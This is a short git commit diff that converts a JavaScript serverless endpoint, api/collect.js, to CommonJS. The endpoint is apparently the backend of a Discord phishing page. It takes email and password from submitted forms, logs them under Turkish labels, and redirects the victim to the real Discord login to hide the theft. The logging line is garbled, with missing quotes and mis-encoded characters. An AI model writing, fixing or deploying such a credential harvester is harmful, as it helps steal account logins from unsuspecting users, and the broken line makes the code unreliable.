cb4b9e0eac41153a4f45751f1ad1a758c687275d
Olsoweirodev <olsoweirodev@gmail.com>
2025-06-18 15:01:19 +0300

    Fix api/collect.js to use CommonJS

--- api/collect.js
+++ api/collect.js
@@ -1,9 +1,9 @@
-export default async function handler(req, res) {
+module.exports = async function handler(req, res) {
   if (req.method === 'POST') {
- const { email, password } = req.body;
- console.log(E-posta: , Þifre: );
- res.redirect(302, 'https://discord.com/login');
+    const { email, password } = req.body;
+    console.log(E-posta: , Þifre: );
+    res.redirect(302, 'https://discord.com/login');
   } else {
- res.status(405).json({ error: 'Method not allowed' });
+    res.status(405).json({ error: 'Method not allowed' });
   }
 }
